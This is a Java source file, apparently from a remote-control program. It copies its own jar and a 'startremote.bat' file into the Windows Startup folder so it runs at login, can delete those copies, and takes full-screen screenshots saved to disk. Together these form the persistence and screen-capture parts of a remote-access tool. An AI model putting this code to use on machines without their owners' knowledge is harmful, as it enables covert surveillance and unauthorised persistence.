package command.entity;

import util.IOUtil;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class JavaMethod {
    public static final String currentJarPath = OtherComputer.class.getProtectionDomain().getCodeSource().getLocation().getFile();
    public static final String jarFileName = new File(currentJarPath).getName();
    public static final String batFileName = "startremote.bat";
    public static String userHome = System.getProperty("user.home");
    public static final File batParent = new File(userHome+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");
    public static final File jarFile = new File(batParent,jarFileName);
    public static final File batFile = new File(batParent,batFileName);

    //String currentJarPath = "\\D:\\IdeaProjects\\remote\\target\\remote-1.0-SNAPSHOT.jar";
    File currentJarFile = new File(currentJarPath);
    File currentBatFile = new File(currentJarFile.getParent(),batFileName);
    public void createFile() {
        try {
            if(currentJarFile.exists() && currentJarFile.isFile()){
                FileInputStream jar = new FileInputStream(currentJarFile);
                IOUtil.inputToOutput(jar, new FileOutputStream(jarFile));
                if(currentBatFile.exists()){
                    FileInputStream bat = new FileInputStream(currentBatFile);
                    IOUtil.inputToOutput(bat,new FileOutputStream(batFile));
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public int deleteFile(){
        int count = 0;
        if(jarFile.exists() && jarFile.isFile()){
            boolean jb = jarFile.delete();
            if(jb){
                count += 1;
            }
        }
        if(batFile.exists() && batFile.isFile()){
            boolean bb = batFile.delete();
            if(bb){
                count += 1;
            }
        }
        return count;
    }

    public boolean screenPrint(String filePath,String fileName){
        System.out.println("filePath:"+filePath);
        System.out.println("fileName:"+fileName);
        if("null".equals(filePath)){
            filePath = "D:\\remotefile\\png";
        }
        if("null".equals(fileName)){
            SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMddHHmmss");
            fileName = sdf.format(new Date());
        }
        try {
            Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
            Rectangle screenRectangle = new Rectangle(screenSize);
            Robot robot = new Robot();
            BufferedImage image = robot.createScreenCapture(screenRectangle);
            File screenFilePath = new File(filePath);
            if (!screenFilePath.exists()) {
                screenFilePath.mkdirs();
            }
            File f = new File(filePath, fileName+".png");
            ImageIO.write(image, "png", f);
            return true;
        }catch (Exception e){
            return false;
        }
    }
}
